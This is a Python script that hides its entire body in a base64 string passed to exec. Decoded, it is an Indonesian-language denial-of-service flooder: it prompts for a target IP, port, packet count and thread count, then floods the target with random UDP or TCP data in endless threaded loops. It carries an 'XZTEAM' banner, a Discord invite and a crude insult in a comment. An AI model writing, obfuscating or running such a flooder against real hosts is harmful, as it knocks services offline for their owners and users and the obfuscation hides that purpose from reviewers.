import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9weXRob24zCiNjb2RlIGJ5IFpYCiNZQU5HIENVUkkgU0NSSVBUIEFOQUsgS09OVE9MCmltcG9ydCByYW5kb20KaW1wb3J0IHNvY2tldCAKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgb3MKaW1wb3J0IHN5cwoKb3Muc3lzdGVtKCJjbGVhciIpCnByaW50KCIiIlwwMzNbOTFtCiBfXyAgX18gX19fX18gIF9fX19fIF9fX19fICAgIF8gICAgX18gX18gCiBcIFwvIC98X18gIC8gfF8gICBffCBfX19ffCAgLyBcICB8ICBcLyAgfAogIFwgIC8gICAvIC8gICAgfCB8IHwgIF98ICAgLyBfIFwgfCB8XC98IHwKICAvICBcICAvIC9fICAgIHwgfCB8IHxfX18gLyBfX18gXHwgfCAgfCB8CiAvXy9cX1wvX19fX3wgICB8X3wgfF9fX19fL18vICAgXF9cX3wgIHxffAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiIiIpCnByaW50KCIjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMiKQpwcmludCgifCBDT0RFIEJZIFpYIikKcHJpbnQoInwgS0FMTyBNQVUgUkVNQUtFIFBNIEdVQSIpCnByaW50KCJ8IEdVTkFLQU4gU0VCQUlLIE1VTkdLSU4iKQpwcmludCgifCBKT0lOIE1ZIENPTU1VTklUWSBodHRwczovL2Rpc2NvcmQuZ2cvdUdwREh2YXU1QSIpCnByaW50KCJ8IEtBTE8gQURBIFlBTkcgRVJST1IgUE0gR1VBIikKcHJpbnQoIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyIpCmlwID0gc3RyKGlucHV0KCIgVEFSR0VUIElQOiIpKQpwb3J0ID0gaW50KGlucHV0KCIgUE9SVCBUQVJHRVQ6IikpCmNob2ljZSA9IHN0cihpbnB1dCgiIERPV04gSU4gWU9LKHkvbik6IikpCnRpbWVzID0gaW50KGlucHV0KCIgUEFDS0VUUzoiKSkKdGhyZWFkcyA9IGludChpbnB1dCgiIElTSSBQQUNLRVQ6IikpCmRlZiBydW4oKToKICAgIGRhdGEgPSByYW5kb20uX3VyYW5kb20oMTAyNCkKICAgIGkgPSByYW5kb20uY2hvaWNlKCgiW1RPSyEhISBUT0shISFdIiwiW1RPSyEhISBUT0shISFdIikpCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRyeToKICAgICAgICAgICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQogICAgICAgICAgICBhZGRyID0gKHN0cihpcCksaW50KHBvcnQpKQogICAgICAgICAgICBmb3IgeCBpbiByYW5nZSh0aW1lcyk6CiAgICAgICAgICAgICAgICBzLnNlbmR0byhkYXRhLGFkZHIpCiAgICAgICAgICAgIHByaW50KGkgKyIgUEVSTUlTSSBQQUtFVCBGUk9NIFhaVEVBTSIpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgiWytdIFNFUlZFUiBET1dOISEhIikKCmRlZiBydW4yKCk6CiAgICBkYXRhID0gcmFuZG9tLl91cmFuZG9tKDE2KQogICAgaSA9IHJhbmRvbS5jaG9pY2UoKCJbVE9LIFRPSyBUT0tdIiwiW1RPSyBUT0sgVE9LXSIpKQogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgICAgIHMuY29ubmVjdCgoaXAscG9ydCkpCiAgICAgICAgICAgIHMuc2VuZChkYXRhKQogICAgICAgICAgICBmb3IgeCBpbiByYW5nZSh0aW1lcyk6CiAgICAgICAgICAgICAgICBzLnNlbmQoZGF0YSkKICAgICAgICAgICAgcHJpbnQoaSArIiBQRVJNSVNJIFBBS0VUIEZST00gWFpURUFNIikKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHMuY2xvc2UoKQogICAgICAgICAgICBwcmludCgiWytdIFNFUlZFUiBET1dOISEhIikKICAgICAgICAKZm9yIHkgaW4gcmFuZ2UodGhyZWFkcyk6CiAgICBpZiBjaG9pY2UgPT0gJ3knOgogICAgICAgIHRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQgPSBydW4pCiAgICAgICAgdGguc3RhcnQoKQogICAgZWxzZToKICAgICAgICB0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuMikKICAgICAgICB0aC5zdGFydCgp'))